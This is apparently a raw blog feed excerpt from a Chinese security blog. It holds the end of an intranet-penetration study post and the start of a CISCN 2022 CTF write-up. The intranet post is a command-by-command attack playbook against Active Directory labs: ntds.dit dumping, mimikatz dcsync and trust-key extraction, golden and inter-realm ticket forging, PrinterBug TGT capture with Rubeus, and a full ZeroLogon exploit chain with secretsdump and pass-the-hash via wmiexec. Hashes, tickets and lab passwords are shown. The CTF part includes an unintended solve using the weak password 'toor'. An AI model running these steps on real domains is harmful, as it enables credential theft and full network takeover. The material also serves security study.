href="https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy">https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162512699.png" alt="image-20220707162512699"></p><p>选择对应版本下载即可</p><p>将这三个程序放到一个文件夹中，执行ShowCopy.bat</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162553598.png" alt="image-20220707162553598"></p><p>执行后:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162651423.png" alt="image-20220707162651423"></p><p>使用 esentutl 修复导出的 ntds.dit 文件:</p><pre><code class="shell">esentutl /p /o ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162752787.png" alt="image-20220707162752787"></p><p>最后通过 QuarksPwDump.exe 导出域账号和散列值:</p><pre><code class="shell">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o result.txt</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162932295.png" alt="image-20220707162932295"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162952291.png" alt="image-20220707162952291"></p><h2 id="跨域攻击分析及防御"><a href="#跨域攻击分析及防御" class="headerlink" title="跨域攻击分析及防御"></a>跨域攻击分析及防御</h2><h3 id="域间信任概述"><a href="#域间信任概述" class="headerlink" title="域间信任概述"></a>域间信任概述</h3><p><strong>为什么会有域信任?</strong></p><p>在同一个域内，管理员可以实现资源的统一管理、分配。有些企业会用到多个域，创建域间信任可以方便跨域资源分配。</p><p><strong>信任是有方向的:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170708834.png" alt="image-20220707170708834"></p><p><strong>信任传递:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170843465.png" alt="image-20220707170843465"></p><p><strong>域树和域林:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171001846.png" alt="image-20220707171001846"></p><p><strong>域间信任实例:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171110376.png" alt="image-20220707171110376"></p><p><strong>域间信任分类</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171153927.png" alt="image-20220707171153927"></p><h3 id="域间信任信息收集、利用思路"><a href="#域间信任信息收集、利用思路" class="headerlink" title="域间信任信息收集、利用思路"></a>域间信任信息收集、利用思路</h3><p><strong>环境搭建</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171848435.png" alt="image-20220707171848435"></p><p><strong>查看域间信任</strong></p><p>命令:</p><pre><code class="shell">nltest /domain_trusts  /primary 仅返回计算机账户属于的域 # 如nltest /domain_trusts /primary/forest 仅返回主域同一森林下的域/direct_out 返回被主域明确信任的域/direct_in 返回明确信任主域的域/all_trusts 返回所有已信任的域/V 显示详细的输出，包括域的SIDs和GUIDs</code></pre><pre><code>netdom query trust #只能在域控上使用</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711230039383.png" alt="image-20220711230039383"></p><p><strong>工具:</strong></p><p><strong>收集域详细信息:</strong></p><p>powerview</p><p>下载链接:<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一般不允许执行，可使用ISESteroids模块绕过</p><pre><code class="shell">PowerShell.exe -ExecutionPolicy Bypass -command &quot;..\powerview.ps1;Get-NetDomainTrust&quot;</code></pre><p>adfind：</p><p>下载链接:<a href="http://www.joeware.net/freetools/tools/adfind/">http://www.joeware.net/freetools/tools/adfind/</a></p><ul><li>-appver：显示adfind版本信息</li><li>-b：指定要查询的根节点basedn</li><li>-bit：指定位查询</li><li>-c:  只统计数量</li><li>-csv：导出为csv格式</li><li>-dn：只显示dn，不返回详细信息</li><li>-f：LDAP过滤条件，指定ldap语法</li><li>-h：指定主机与端口(ip:port)</li><li>-recmute：删除dn下面没有的</li><li>-s：搜索的范围， 有 one(当前层级)/sub(一层一层递归)，默认是sub</li><li>-sdna：非域管查询sd信息</li><li>-t：查询超时时间，默认120秒</li><li>-u：指定用户</li><li>-up：指定用户的密码</li></ul><pre><code>adfind.exe -h ip -sc u:* #如 AdFind.exe -h WIN-OSOIFGPM536.sakura.com -sc u:Administrator</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710000000436.png" alt="image-20220710000000436"></p><p>adexplorer</p><p>下载链接:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer</a></p><p>输入域控的账号密码就可以进行管理</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710092143570.png" alt="image-20220710092143570"></p><p><strong>收集域网络信息:</strong></p><p>nltest、ping、dnscmd</p><pre><code>nltest /domain_trustsnltest /dclist:companyping sakura.comdnscmd /enumzones</code></pre><p><strong>利用思路</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710093631488.png" alt="image-20220710093631488"></p><h3 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h3><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094448657.png" alt="image-20220710094448657"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094713427.png" alt="image-20220710094713427"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094732640.png" alt="image-20220710094732640"></p><h4 id="SIDHistory介绍和利用"><a href="#SIDHistory介绍和利用" class="headerlink" title="SIDHistory介绍和利用"></a>SIDHistory介绍和利用</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094901181.png" alt="image-20220710094901181"></p><p><strong>利用域信任密钥获取目标域权限</strong></p><ul><li><p>存在信任账户的情况下：Dcsync获取信任账号的NTLM值</p></li><li><pre><code>Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125; #如何无法找到Get-ADuser命令，则导入模块 import-module activedirectory</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231847885.png" alt="image-20220711231847885"></p><ul><li><pre><code class="shell">.\mimikatz.exe &quot;lsadump::dcsync /user:sakura$@HY.sakura.com&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231746078.png" alt="image-20220711231746078"></p><hr><ul><li><p>内部信任:lsadump获取信任账号的NTLM值</p></li><li><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:sakura$&quot; &quot;lsadump::trust /patch&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711232854715.png" alt="image-20220711232854715"></p><p><strong>信任票据的创建</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710102754875.png" alt="image-20220710102754875"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /rc4:56de60dc2e57db6b03fc5e9834965f26 /user:sakura /service:krbtgt /target:sakura.com /ticket:sakura.kirbi&quot; #/ticket后面的含义是保存的文件名</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235022847.png" alt="image-20220711235022847"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235119876.png" alt="image-20220711235119876"></p><p>我们先看，目前是无法访问父域资源的</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235628387.png" alt="image-20220711235628387"></p><p><strong>TGS获取和利用</strong></p><pre><code>.\asktgs.exe C:\Users\Administrator\Desktop\sakura.kirbi CIFS/fy.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000226225.png" alt="image-20220712000226225"></p><pre><code class="shell">.\kirbikator.exe lsa .\CIFS.fy.sakura.com.kirbi</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000341715.png" alt="image-20220712000341715"></p><p>然后就可以成功对子域进行操作了</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000536307.png" alt="image-20220712000536307"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712001240811.png" alt="image-20220712001240811"></p><h4 id="利用krbtgt散列获取目标域权限"><a href="#利用krbtgt散列获取目标域权限" class="headerlink" title="利用krbtgt散列获取目标域权限"></a>利用krbtgt散列获取目标域权限</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712110239522.png" alt="image-20220712110239522"></p><p><strong>kebtgt散列获取</strong></p><pre><code class="shell">privilege::debuglsadump::lsa /patch /user:krbtgtsekurlsa::krbtgtexit</code></pre><p>或者直接合并成一句话</p><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:krbtgt&quot; &quot;sekurlsa::krbtgt&quot; &quot;exit&quot;</code></pre><p><strong>构造并注入黄金票据</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111832854.png" alt="image-20220712111832854"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /user:administrator /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /krbtgt:803b57a2a73cdc03133e631db7f506ad /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111644256.png" alt="image-20220712111644256"></p><h3 id="林信任攻击"><a href="#林信任攻击" class="headerlink" title="林信任攻击"></a>林信任攻击</h3><p>我这里设置两个域:</p><p>sakura.com、salmon.com</p><p>一台 ly-1 密码:yk2012.com</p><p>一台 ly-2 密码:yk-22012.com</p><h4 id="MS-RPPRN获取信任林权限"><a href="#MS-RPPRN获取信任林权限" class="headerlink" title="MS-RPPRN获取信任林权限"></a>MS-RPPRN获取信任林权限</h4><p><strong>利用条件</strong>:需要设置一台主机账户开启了非约束委派域内机器的权限，实际可配合powerview脚本查找主机，域控主机需要为win2012 server r2 以上 版本，Print Spooler服务默认是自动运行的</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712112745485.png" alt="image-20220712112745485"></p><p><strong>实验场景:</strong></p><ul><li>已获得一个林的权限(EA).。本例为sakura.com</li><li>配置了无约束委派的、已被攻击者控制的一台服务器(ly-1.sakura.com)</li><li>在演示案例中，攻击者入侵了根域的域控制器(DC),利用该DC攻击另一个域林中的另一个DC</li><li>目标域林:本例中为salmon.com</li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713162710957.png" alt="image-20220713162710957"></p><p><strong>攻击示意图</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150156656.png" alt="image-20220712150156656"></p><p><strong>利用工具</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150254348.png" alt="image-20220712150254348"></p><pre><code class="shell">.\Rubeus.exe monitor /interval:5 /filteruser:ly-2$</code></pre><p>interval参数用于设置监控的时间间隔，单位为秒；filteruser用于指定渗透测试中需要关注的用户</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160424988.png" alt="image-20220713160424988"></p><pre><code class="shell">.\SpoolSample.exe ly-2.salmon.com ly-1.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713155559395.png" alt="image-20220713155559395"></p><p>此时rubeus监听到了TGT</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160359007.png" alt="image-20220713160359007"></p><p>使用Rubeus工具直接把base64字符串导入票据：</p><pre><code class="shell">.\Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQwbClNBTE1PTi5DT02iHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbClNBTE1PTi5DT02jggPCMIIDvqADAgESoQMCAQKiggOwBIIDrBG1txlv0N5lRuOFLSbrz8uiCgjf4LwfNvlgi5p0Q80N4A9p301eRDthpV4Bwd7JCHjL7tQ/gZNU3cbA6PO3YCpg5AiVYcR7OnvfIU2LByxKN2iA4YMXRTIhFJZlRiuu4Wh2CQVbDHM+WR8rTHwnAetzq9uOkUrL7HiyK09IT1dmaQS5z7jm3WoRiSfqzfqrqpkrYUXHrKTNmeqdOxX9moYgpsFjKXwMZdHVcmnDLndt147OhMQfFOKwiVtN29YH/rvbmJnrYVLu6ZWZZpi7bj/bXY9pY8GeoNGxJMVZbiULiRnfToi0Db8DMpo115omCnsX7qfquZp5NmbyzO2/V1jknoUQ6k2qIvF+bvjydlh1PciiWxosTAMbD6bJMvwUUT78DZN6IRW9Dg0p3PgVexL73/BwCJ8f89cMzdXh7kZHm/ozhJI9uf1p0v9J2tu0g3flGDo+MF+VZBYBgVXNHiCM1oQGuEPI0Lx2Xs1JR5CCq4HdGh0tNgBIc7ppYg9W8S+6OfZU8dyQdtFh2Rc76CNHEipCzCZYBTctIJ5IV02oPzTM3lvQrbd2BsDBpWPqlV3u/7r5vm2ywp81yA2n7ZCYrZP+F9NP46IXIQ0hKT9VKoNf5ODqbH7H+0bfZogAMuMNN7Bs746NyC7qjhUbRWlmtRNfSlNqaHvsXdzcG7s87gTO9bS0v4Vxxf1ZFGnjsXfia/zvjIFymUdTJzak86FjyCj9HzxWmnSnImwT2WShnWex+S5PfOnuH7Mu8hSe/riKpdK1HdrRL3hBhhsT+vE3HNmLr7DIF0iZ5523Fibp0tOAgGf0LABdHa60anzlOSR5k2gWLSa4JifMxjohaQ5VUt3af6hewd67ZuTL9afVJyvYgAhjOsG7WEPJ1xgN3kOSp9KO+gZV7h9nKEeSScCaIDp5N29fU9CSxOzfQwct7i12BJwSGCK17S3M84v3DSXZWHmq891p2rw4Sr8BBEOE0FDfRhdnboNzkQ5Qf7CS2pafxLxtfQDiWKu2JQdRzNrLkb30zTBG4/uY/o9TBiN5mPSOPSjEqKVurkU3T0M1mYGaX9S0NdppQHKTMDEFdSMY58YzQ25PaEqMqUlvwI0V8c4cVRHsAtefz8GPfHS1I5ENB0OsSoRmWfel0T9/XX7gUjxgf4pQDYzLKb+WZm2fVMKVfB+U2kLcDC3oQ2wnRkmAYLYxJrKOVJRQVlPbIwhCsaP0JYX658qEA6BO9DjhJbz4jfXzOL+TH7ejgd0wgdqgAwIBAKKB0gSBz32BzDCByaCBxjCBwzCBwKArMCmgAwIBEqEiBCAsySonk73tkRU5Ja0UNRWW/zhAgUSZuBym4G3BFO7qKqEMGwpTQUxNT04uQ09NohIwEKADAgEBoQkwBxsFTFktMiSjBwMFAGChAAClERgPMjAyMjA3MTMwNzM0NDRaphEYDzIwMjIwNzEzMTczNDQ0WqcRGA8yMDIyMDcxMzE3MzQ0NFqoDBsKU0FMTU9OLkNPTakfMB2gAwIBAqEWMBQbBmtyYnRndBsKU0FMTU9OLkNPTQ==</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163130505.png" alt="image-20220713163130505"></p><pre><code class="shell">.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /user:krbtgt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163220750.png" alt="image-20220713163220750"></p><pre><code class="shell">.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::purge&quot; exit.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::golden /user:administrator /domain:salmon.com /sid:S-1-5-21-3200352805-2293635123-428118185 /rc4:8da01a075e60007f23b3ce18b77b9a0f /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713164513444.png" alt="image-20220713164513444"></p><p><strong>进一步利用，命令执行</strong></p><pre><code>.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /all /csv&quot; exit</code></pre><p>获得信息:</p><pre><code class="shell">1104    SAKURA$ 76771a6354707379eb4bfd77a28224e5        20801001    LY-2$   0d9a393377c2f46a3b2a20a95954e540        532480500     Administrator   8168027b15e25c5d6ad39528429229d6        512502     krbtgt  8da01a075e60007f23b3ce18b77b9a0f        514</code></pre><pre><code>python3 ./wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:8168027b15e25c5d6ad39528429229d6 ly-2.salmon.com/administrator@192.168.64.151</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713171855227.png" alt="image-20220713171855227"></p><h4 id="扩展-CVE-2020-1472-windows域控提权"><a href="#扩展-CVE-2020-1472-windows域控提权" class="headerlink" title="扩展 CVE-2020-1472 windows域控提权"></a>扩展 CVE-2020-1472 windows域控提权</h4><p>CVE-2020-1472 是⼀个 windows 域控中严重的远程权限提升漏洞，攻击者通过 NetLogon，建⽴与域控间易受攻击的安全通道时，可利⽤此漏洞获取域管访问权限（将域控中保存在AD中的管理员password设置为空）；其漏洞原理是发⽣在 RPC 认证过程的过程中，由于错误的使⽤了 AES-CFB8 加密所导致漏洞成因，该漏洞适⽤于 Win2008 后的所有版本</p><p>利用场景：获取了一个加入了域的计算机权限，在域普通账号的情况下，将域管密码置空，导出域管hash，然后进行连接 </p><p>ps：在实战环境中，由于会把域控机器的账户和密码清空，所以有可能会导致域内出问题，可能导致某些服务⽆法正常运⾏，严重会造成脱域等情况，请谨慎利⽤。</p><p>前置条件：目标域控存在此漏洞未打补丁，这个漏洞用到了MS-NRPC协议，用到了135端口</p><p>注意：在检测或者执行exp的时候，所在主机不一定加入域环境中，在涉及域解析的时候直接在hosts里面设置域名对应ip就行</p><p>复现步骤:</p><p>首先获取主机名:</p><pre><code class="shell">nbtstat -A 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713221143362.png" alt="image-20220713221143362"></p><p><strong>探测是否存在漏洞:</strong></p><p>链接:<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223158821.png" alt="image-20220713223158821"></p><p><strong>存在漏洞，下一步拿exp去打</strong></p><p>exp链接:<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><pre><code class="shell">python3 cve-2020-1472-exploit.py ly-1 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223643646.png" alt="image-20220713223643646"></p><p><strong>导出密码</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass &gt; ~/Desktop/pass.txt</code></pre><p>ps:kali $前要加个转义符号！</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230309872.png" alt="image-20220713230309872"></p><p><strong>连接上去</strong></p><pre><code class="shell">python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:07d312335be3ab7eceda2a6d341e5cbb ly-1.sakura.com/administrator@192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230637115.png" alt="image-20220713230637115"></p><p>成功连接</p><p><strong>恢复域控原始hash</strong></p><pre><code class="shell">reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.savelget system.savelget sam.savelget security.save</code></pre><p><strong>删除文件</strong></p><pre><code class="shell">del /f system.savedel /f sam.savedel /f security.save</code></pre><p><strong>通过 sam.save、security.save、system.save 这些⽂件获得原来域控机器上的 Ntlm Hash 值，⽤于恢复密码</strong></p><pre><code class="shell">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713234613032.png" alt="image-20220713234613032"></p><p><strong>通过拿到 $MACHINE.ACC: 的值，然后进⾏恢复</strong></p><p>脚本下载：<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><p>使用方法:python reinstall_original_pw.py 域控机器名 域控ip $MACHINE.ACC后半部分的值</p><pre><code class="shell">python3 reinstall_original_pw.py ly-1 192.168.64.150 d6b706f6a4ea457327a4bfc1c4c642cb</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235319943.png" alt="image-20220713235319943"></p><p><strong>测试是否恢复成功</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235714975.png" alt="image-20220713235714975"></p><p>此时使用空密码去获取域内的所有用户的凭证已经不行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;内网安全第一章&quot;&gt;&lt;a href=&quot;#内网安全第一章&quot; class=&quot;headerlink&quot; title=&quot;内网安全第一章&quot;&gt;&lt;/a&gt;内网安全第一章&lt;/h1&gt;&lt;h2 id=&quot;内网基础知识&quot;&gt;&lt;a href=&quot;#内网基础知识&quot; class=</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2022</title>
    <link href="https://sakurahack-y.github.io/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/"/>
    <id>https://sakurahack-y.github.io/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/</id>
    <published>2022-06-20T15:35:31.000Z</published>
    <updated>2022-07-06T07:08:16.343Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到:"></a>签到:</h2><p>根据公众号给的提示，可构造出脚本</p><pre><code>a=&#39;5543053560369047024142002765898038342775948119489181360354534575324142175929505171739721800870791249314864251567972295612874802183218042622056229755674962381242884261754543945970151712920835729189983000341612995263262927255805323073625456260457938936828798227686401899839962031005363203251056213941366146686875718432385301325733733171999005964405664494560905422663352160064965067318132130228461655121372448333527884088007285116323305598946651171485490621766011242810388503390388653399069240050404600114824579296172741241184113479&#39;a=a[0:28]tmp=&#39;0&#39;b=&#39;1732251413440356045166710055&#39;for i in range(28):    print((ord(a[i])+ord(b[i])-2*ord(tmp[0]))%10,end=&quot;&quot;)</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121548778.png" alt="image-20220529121548778"></p><p>访问url:</p><p>xxx/send?msg=s</p><p>再访问</p><p>xxx/send?msg=6275204973709393069208712710</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121645372.png" alt="image-20220529121645372"></p><h2 id="基于挑战码的双向认证1"><a href="#基于挑战码的双向认证1" class="headerlink" title="基于挑战码的双向认证1"></a>基于挑战码的双向认证1</h2><h2 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h2><p>非预期解:</p><p>连接ssh</p><p>进入</p><p>/root/cube-shell/instance/flag_server 目录</p><p>两个flag全在里面</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529124444190.png" alt="image-20220529124444190"></p><h2 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h2><p>非预期</p><p>连接ssh</p><p>进入</p><p>/root/cube-shell/instance/flag_server 目录</p><p>su root</p><p>弱口令密码:toor</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529142614152.png" alt="image-20220529142614152"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>直接填问卷即可得到flag</p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><pre><code>tshark -T json -r ez_usb.pcapng &gt; data.json</code></pre><p>导出json数据</p><p>经过分析，它是有两个键盘流量。</p><p>分离一下</p><pre><code>import jsonjsonData=&quot;&quot;with open(&quot;data.json&quot;) as f:    text=f.read()    jsonData=json.loads(text)data_1=&quot;&quot;data_2=&quot;&quot;for i in jsonData:    try:        if i[&quot;_source&quot;][&quot;layers&quot;][&quot;usb&quot;][&quot;usb.src&quot;]==&quot;2.8.1&quot;:            data_1+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;        else:            data_2+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;    except:        passprint(data_1)print(data_2)</code></pre><p>分别保存为1.txt,2.txt</p><p>使用网上现成得脚本进行提取数据</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, 